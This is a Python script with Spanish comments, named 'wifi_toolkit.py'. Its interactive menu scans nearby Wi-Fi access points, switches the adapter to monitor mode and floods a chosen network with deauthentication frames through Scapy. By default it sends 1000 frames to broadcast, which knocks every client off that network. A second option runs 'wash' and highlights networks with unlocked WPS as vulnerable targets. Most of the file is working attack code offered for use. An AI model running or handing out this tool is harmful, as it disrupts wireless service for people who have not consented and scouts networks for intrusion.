#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
wifi_toolkit.py – Escaneo de redes, Ataque de Deautenticación y Detección de WPS.
Se asegura de dejar la interfaz en modo managed al terminar.
Versión mejorada con análisis profesional y menú de acciones.
"""
import argparse
import re
import subprocess
import sys
import signal
import atexit
import os  # Para la verificación de root
import shutil  # Para la verificación de herramientas (shutil.which)
from pathlib import Path
from contextlib import suppress

try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
except ImportError:
    # Esta verificación es para Scapy, crucial para deauth.
    # Se podría mover a la sección deauth si WPS es la única acción.
    # Por ahora, se mantiene global ya que es una dependencia original.
    print("[!] Scapy no está instalado. Funcionalidad de Deauth no disponible.")
    print("    Por favor, instálalo: pip install scapy")
    SCAPY_AVAILABLE = False
else:
    SCAPY_AVAILABLE = True

# Constantes
WASH_SCAN_DURATION = 45  # Segundos para el escaneo con wash

# --------------------- utilidades de modo ---------------------
def restore_managed(iface: str):
    """
    Intenta volver la interfaz especificada a modo managed y activarla.
    Función "best-effort" para cleanup.
    """
    print(f"[*] Intentando restaurar '{iface}' a modo managed...")
    try:
        subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True, text=True, timeout=5)
        subprocess.run(["iw", iface, "set", "type", "managed"], capture_output=True, text=True, timeout=5)
        subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True, text=True, timeout=5)
        print(f"[*] Interfaz '{iface}' configurada a modo managed (o se intentó).")
    except subprocess.TimeoutExpired:
        print(f"[!] Timeout durante restore_managed para '{iface}'. La interfaz podría estar en un estado inconsistente.")
    except Exception as e:
        print(f"[!] Excepción no esperada durante restore_managed para '{iface}': {e}")

def enable_monitor(iface: str):
    """Habilita el modo monitor en la interfaz especificada."""
    print(f"[*] Habilitando modo monitor en '{iface}'...")
    try:
        subprocess.run(["ip", "link", "set", iface, "down"], check=True, capture_output=True, text=True)
        iw_set_monitor_cmd = ["iw", iface, "set", "monitor", "none"]
        result = subprocess.run(iw_set_monitor_cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            iwconfig_path = shutil.which("iwconfig")
            if iwconfig_path:
                print(f"[*] Falló '{' '.join(iw_set_monitor_cmd)}'. Intentando con '{iwconfig_path} {iface} mode monitor'...")
                iwconfig_cmd = [iwconfig_path, iface, "mode", "monitor"]
                subprocess.run(iwconfig_cmd, check=True, capture_output=True, text=True)
            else:
                raise subprocess.CalledProcessError(result.returncode, iw_set_monitor_cmd, output=result.stdout, stderr=result.stderr)
        subprocess.run(["ip", "link", "set", iface, "up"], check=True, capture_output=True, text=True)
        print(f"[*] Interfaz '{iface}' en modo monitor.")
    except subprocess.CalledProcessError as e:
        error_output = e.stderr.strip() if e.stderr else (e.stdout.strip() if e.stdout else str(e))
        sys.exit(f"[!] Error configurando modo monitor para '{iface}': {error_output}")
    except FileNotFoundError as e:
        sys.exit(f"[!] Error: Comando no encontrado durante enable_monitor: {e.filename}")

def set_channel(iface: str, ch: int):
    """Establece el canal de la interfaz Wi-Fi."""
    print(f"[*] Estableciendo canal {ch} en '{iface}'...")
    try:
        subprocess.run(["iw", iface, "set", "channel", str(ch)], check=True, capture_output=True, text=True)
        print(f"[*] Canal {ch} establecido en '{iface}'.")
    except subprocess.CalledProcessError as e:
        error_output = e.stderr.strip() if e.stderr else str(e)
        sys.exit(f"[!] Error estableciendo canal {ch} en '{iface}': {error_output}")
    except FileNotFoundError:
        sys.exit(f"[!] Error: Comando 'iw' no encontrado para set_channel.")

# ------------------------ Utilidades de escaneo y parseo ------------------------------
FREQ_BANDS = {"2.4 GHz": (2000, 3000), "5 GHz": (5000, 6000)}
def band_from_freq(f: float) -> str:
    return next((b for b, (lo, hi) in FREQ_BANDS.items() if lo <= f < hi), "Otra")

def scan_aps_with_iw(iface: str) -> list:
    """Escanea redes Wi-Fi usando 'iw dev <iface> scan' (para Deauth)."""
    print(f"[*] Escaneando redes (con 'iw') en '{iface}' (esto puede tardar unos segundos)...")
    try:
        raw_scan_output = subprocess.run(
            ["iw", "dev", iface, "scan"],
            capture_output=True, text=True, check=True, timeout=30
        ).stdout
    except subprocess.CalledProcessError as e:
        error_msg = f"[!] Falló el escaneo con 'iw' en '{iface}'. ¿Está la interfaz arriba y es correcta?\n"
        error_msg += f"   Comando: {' '.join(e.cmd)}\n   Salida de Error: {e.stderr.strip() if e.stderr else 'No stderr'}"
        sys.exit(error_msg)
    except FileNotFoundError:
        sys.exit(f"[!] Error: Comando 'iw' no encontrado para escanear.")
    except subprocess.TimeoutExpired:
        sys.exit(f"[!] Timeout durante el escaneo con 'iw' en '{iface}'. La interfaz podría no responder.")

    found_networks, current_ap_data = [], {}
    # (Lógica de parseo de 'iw scan' - sin cambios respecto a la versión anterior)
    for line in raw_scan_output.splitlines():
        line = line.strip()
        if line.startswith("BSS"):
            if current_ap_data:
                if 'Channel_explicit' in current_ap_data: current_ap_data['Channel'] = current_ap_data['Channel_explicit']
                elif 'Channel_calc' in current_ap_data: current_ap_data['Channel'] = current_ap_data['Channel_calc']
                current_ap_data.pop('Channel_calc', None); current_ap_data.pop('Channel_explicit', None)
                found_networks.append(current_ap_data)
            bssid_match = re.search(r'([0-9A-Fa-f:]{17})', line)
            current_ap_data = {"BSSID": bssid_match.group(1).lower() if bssid_match else "--"}
        elif line.startswith("SSID:"):
            current_ap_data["SSID"] = line.split("SSID:",1)[1].strip() or "<oculto>"
        elif line.startswith("freq:"):
            freq_str = line.split("freq:",1)[1].strip()
            if freq_str:
                try:
                    f = float(freq_str)
                    current_ap_data['Freq_MHz'] = f
                    current_ap_data['Banda'] = band_from_freq(f)
                    current_ap_data['Channel_calc'] = int(round((f - 2407) / 5)) if f < 3000 else int(round((f - 5000) / 5))
                except ValueError: print(f"[!] Advertencia: Frecuencia inválida '{freq_str}' para BSSID {current_ap_data.get('BSSID', 'desconocido')}")
        elif "DS Parameter set: channel" in line:
            ch_match = re.search(r'channel (\d+)', line)
            if ch_match: current_ap_data['Channel_explicit'] = int(ch_match.group(1))
        elif "HT Operation:" in line and 'Channel_explicit' not in current_ap_data:
            ch_match = re.search(r'primary channel (\d+)',line)
            if ch_match: current_ap_data['Channel_explicit'] = int(ch_match.group(1))
        elif "VHT Operation:" in line and 'Channel_explicit' not in current_ap_data:
            ch_match = re.search(r'channel: (\d+)', line)
            if ch_match: current_ap_data['Channel_explicit'] = int(ch_match.group(1))
    if current_ap_data:
        if 'Channel_explicit' in current_ap_data: current_ap_data['Channel'] = current_ap_data['Channel_explicit']
        elif 'Channel_calc' in current_ap_data: current_ap_data['Channel'] = current_ap_data['Channel_calc']
        current_ap_data.pop('Channel_calc', None); current_ap_data.pop('Channel_explicit', None)
        found_networks.append(current_ap_data)
    return found_networks

# ----------------------- Flujo de Ataque de Deautenticación -------------------------------
def send_deauth_packets(iface: str, ap_bssid: str, client_mac: str, count: int, interval: float):
    """Envía paquetes de deautenticación usando Scapy."""
    if not SCAPY_AVAILABLE:
        sys.exit("[!] Scapy no está disponible. No se puede enviar paquetes deauth.")
    target_mac = client_mac if client_mac and client_mac.strip() else "ff:ff:ff:ff:ff:ff"
    frame = RadioTap() / Dot11(addr1=target_mac, addr2=ap_bssid, addr3=ap_bssid) / Dot11Deauth(reason=7)
    print(f"[*] Enviando {count} frames deauth a Cliente: {target_mac} (vía AP: {ap_bssid}) en iface '{iface}'. Intervalo: {interval}s.")
    print(f"    (Presiona Ctrl+C para intentar detener el envío antes de completar los {count} paquetes)")
    try:
        sendp(frame, iface=iface, count=count, inter=interval, verbose=False)
        print(f"[*] Envío de {count} paquetes deauth completado.")
    except Exception as e:
        print(f"[!] Error durante el envío de paquetes deauth con Scapy: {e}")

def run_deauth_workflow(iface: str, args: argparse.Namespace):
    """Ejecuta el flujo completo del ataque de deautenticación."""
    print("\n--- Iniciando Flujo de Ataque de Deautenticación ---")
    
    # Poner interfaz en modo managed y ARRIBA antes de escanear.
    print(f"[*] Preparando interfaz '{iface}' para escaneo de APs (modo managed)...")
    restore_managed(iface)

    networks = scan_aps_with_iw(iface)
    if not networks:
        sys.exit(f"[!] No se encontraron APs en la interfaz '{iface}' para deauth.")

    print("\n--- APs Encontrados para Deauth ---")
    print("ID  SSID                           BSSID             Banda   Canal")
    print("--  ------------------------------ ----------------- ------- -----")
    for i, net in enumerate(networks):
        ssid_d = net.get('SSID','<oculto>')[:30]; bssid_d = net.get('BSSID','--')
        band_d = net.get('Banda','?'); ch_d = str(net.get('Channel','--'))
        print(f"{i:2}  {ssid_d:<30} {bssid_d:<17} {band_d:<7} {ch_d:>5}")

    selected_ap = None
    while True: # Selección de AP
        try:
            selection_str = input("\n[?] Ingresa el ID del AP objetivo para deauth: ")
            if not selection_str: continue
            ap_id = int(selection_str)
            if 0 <= ap_id < len(networks): selected_ap = networks[ap_id]; break
            else: print("  >> ID fuera de rango. Intenta de nuevo.")
        except ValueError: print("  >> ID inválido. Por favor, ingresa un número.")
    
    ap_bssid = selected_ap.get("BSSID"); ap_channel = selected_ap.get("Channel")
    ap_ssid_display = selected_ap.get("SSID", "Desconocido")

    if not ap_bssid or ap_bssid == "--": sys.exit(f"[!] BSSID del AP ('{ap_ssid_display}') no válido.")
    if not isinstance(ap_channel, int): sys.exit(f"[!] No se pudo determinar canal para AP '{ap_ssid_display}'.")
    print(f"[*] AP Objetivo: SSID='{ap_ssid_display}', BSSID={ap_bssid}, Canal={ap_channel}")

    client_mac_input = input("[?] MAC del cliente (opcional, ENTER para broadcast): ").strip().lower()
    if client_mac_input and not re.fullmatch(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", client_mac_input):
        sys.exit("[!] Formato de MAC de cliente inválido.")
    
    print(f"[*] Preparando interfaz '{iface}' para ataque deauth (modo monitor)...")
    enable_monitor(iface)
    set_channel(iface, ap_channel)
    send_deauth_packets(iface, ap_bssid, client_mac_input, args.count, args.interval)
    print("--- Flujo de Ataque de Deautenticación Finalizado ---")

# ----------------------- Detección de WPS -------------------------------
def parse_wash_output(wash_output_str: str) -> list:
    """Parsea la salida de la herramienta 'wash'."""
    networks = []
    # Regex mejorada para capturar campos de wash, incluyendo ESSID con espacios
    # BSSID Ch RSSI WPSVer WPSLocked ESSID
    # XX:XX:XX:XX:XX:XX Ch RSSI Ver Locked ESSID_CON_ESPACIOS
    line_regex = re.compile(
        r"^((?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})\s+"  # BSSID
        r"(\d+)\s+"                                   # Channel
        r"(-?\d+)\s+"                                 # RSSI
        r"([\d\.]+)\s+"                               # WPS Version
        r"(\S+)\s+"                                   # WPS Locked (Yes, No, N/A, Unknown)
        r"(.+)$"                                      # ESSID (resto de la línea)
    )
    header_found = False
    for line in wash_output_str.splitlines():
        line = line.strip()
        if not line: continue
        if "BSSID" in line and "Ch" in line and "ESSID" in line: # Identificador del Header
            header_found = True
            continue
        if not header_found: continue # Ignorar líneas antes del header (ej. mensajes de wash)

        match = line_regex.match(line)
        if match:
            networks.append({
                "BSSID": match.group(1).lower(),
                "Channel": int(match.group(2)),
                "RSSI": int(match.group(3)),
                "WPS Version": match.group(4),
                "WPS Locked": match.group(5),
                "ESSID": match.group(6).strip()
            })
    return networks

def run_wps_detection(iface: str):
    """Escanea y detecta redes con WPS usando 'wash'."""
    print("\n--- Iniciando Detección de WPS ---")
    wash_path = shutil.which("wash")
    if not wash_path:
        sys.exit("[!] Herramienta 'wash' (del paquete reaver) no encontrada. Por favor, instálala.")

    print(f"[*] Preparando interfaz '{iface}' para escaneo WPS (modo monitor)...")
    enable_monitor(iface) # wash necesita modo monitor

    print(f"[*] Ejecutando 'wash' en '{iface}' durante {WASH_SCAN_DURATION} segundos...")
    print("    (Esto puede tomar un momento, 'wash' está escaneando todos los canales)")
    try:
        # -C ignora errores FCS, -s ordena por RSSI (si la versión de wash lo soporta, si no, se ignora)
        # Algunas versiones de wash no tienen -s. Sería mejor no incluirlo o chequear versión.
        # Por simplicidad, se omite -s.
        wash_cmd = [wash_path, "-i", iface, "-C"]
        process = subprocess.run(
            wash_cmd, capture_output=True, text=True, timeout=WASH_SCAN_DURATION + 10 # Un poco más de timeout
        )
        wash_output = process.stdout
        if process.stderr: # Mostrar errores de wash si los hay
             print(f"[!] 'wash' stderr:\n{process.stderr.strip()}")

    except FileNotFoundError: # Si wash_path es None pero el check inicial falló
        sys.exit(f"[!] Error crítico: 'wash' no encontrado aunque el chequeo inicial lo pasó (esto no debería ocurrir).")
    except subprocess.TimeoutExpired:
        print(f"[!] 'wash' finalizó por timeout después de {WASH_SCAN_DURATION} segundos.")
        # Intenta obtener la salida parcial si el proceso guardó algo
        wash_output = process.stdout if 'process' in locals() and hasattr(process, 'stdout') else ""
        if not wash_output:
            print("[!] No se obtuvo salida de 'wash' antes del timeout.")
            return # Salir de la función si no hay salida
    except Exception as e:
        sys.exit(f"[!] Error ejecutando 'wash': {e}")
    
    if not wash_output.strip():
        print("[!] No se obtuvo salida de 'wash' o no se encontraron redes WPS.")
        return

    wps_networks = parse_wash_output(wash_output)

    if not wps_networks:
        print("[*] No se encontraron redes con WPS activado durante el escaneo.")
    else:
        print("\n--- Redes con WPS Detectadas ---")
        print("BSSID             Ch  RSSI  WPS Ver.  Bloqueado  ESSID")
        print("----------------- --  ----  --------  ---------  ------------------------------")
        for net in wps_networks:
            locked_status = net.get("WPS Locked", "Unk")
            # Destacar redes potencialmente vulnerables (WPS habilitado y NO bloqueado)
            highlight = " <<< ¡WPS Desbloqueado!" if locked_status.lower() == "no" else ""
            print(f"{net['BSSID']:<17} {net['Channel']:>2}  "
                  f"{net['RSSI']:>4}  {net.get('WPS Version', 'N/A'):<8} "
                  f"{locked_status:<9}  {net['ESSID'][:30]}{highlight}")
    print("--- Detección de WPS Finalizada ---")

# ------------------------ main -------------------------------
def main():
    if os.geteuid() != 0:
        sys.exit("[!] Este script requiere privilegios de root. Intenta con 'sudo'.")

    common_tools = ["ip", "iw"]
    for tool in common_tools:
        if shutil.which(tool) is None: sys.exit(f"[!] '{tool}' no encontrado.")
    if shutil.which("iwconfig") is None: print("[!] Advertencia: 'iwconfig' no encontrado (fallback para modo monitor).")

    parser = argparse.ArgumentParser(
        description="wifi_toolkit.py – Escaneo, Deauth y Detección WPS.",
        epilog="Ejemplo: sudo python3 wifi_toolkit.py -i wlan0"
    )
    parser.add_argument("-i","--interface", default="wlan0", help="Interfaz Wi-Fi (ej: wlan0). Default: wlan0")
    # Argumentos específicos para deauth, se ignorarán en otras acciones
    parser.add_argument("-c","--count", type=int, default=1000, help="[Deauth] Paquetes a enviar. Default: 1000")
    parser.add_argument("--interval", type=float, default=0.1, help="[Deauth] Intervalo entre paquetes. Default: 0.1")
    args = parser.parse_args()

    iface = args.interface
    if not Path(f"/sys/class/net/{iface}").is_dir():
        sys.exit(f"[!] Interfaz '{iface}' no encontrada en /sys/class/net/.")

    atexit.register(restore_managed, iface) # Registrar cleanup global
    def custom_signal_handler(sig, frame):
        print(f"\n[!] Señal {signal.Signals(sig).name} recibida. Limpiando y saliendo...")
        sys.exit(0)
    signal.signal(signal.SIGINT, custom_signal_handler)
    signal.signal(signal.SIGTERM, custom_signal_handler)

    # --- Menú de Selección ---
    while True:
        print("\n╔══════════════════════════════╗")
        print("║       WiFi Toolkit Menú      ║")
        print("╠══════════════════════════════╣")
        print("║ 1. Ataque de Deautenticación ║")
        print("║ 2. Detección de WPS          ║")
        print("║ 3. Salir                     ║")
        print("╚══════════════════════════════╝")
        choice = input("Selecciona una opción (1-3): ").strip()

        if choice == '1':
            if not SCAPY_AVAILABLE:
                 print("[!] Scapy no está disponible. Esta opción no puede continuar.")
                 continue # Volver al menú
            run_deauth_workflow(iface, args)
            break 
        elif choice == '2':
            run_wps_detection(iface)
            break
        elif choice == '3':
            print("[*] Saliendo del script.")
            sys.exit(0)
        else:
            print("[!] Opción no válida. Por favor, elige entre 1 y 3.")

if __name__ == "__main__":
    try:
        main()
    except SystemExit as e:
        if e.code is not None and e.code != 0 and str(e): print(str(e))
        sys.exit(e.code if e.code is not None else 1)
    except KeyboardInterrupt:
        print("\n[!] Script interrumpido por el usuario (KeyboardInterrupt global).")
        sys.exit(130) 
    except Exception as e:
        print(f"[!!!] Error inesperado y no capturado en el script: {type(e).__name__}: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)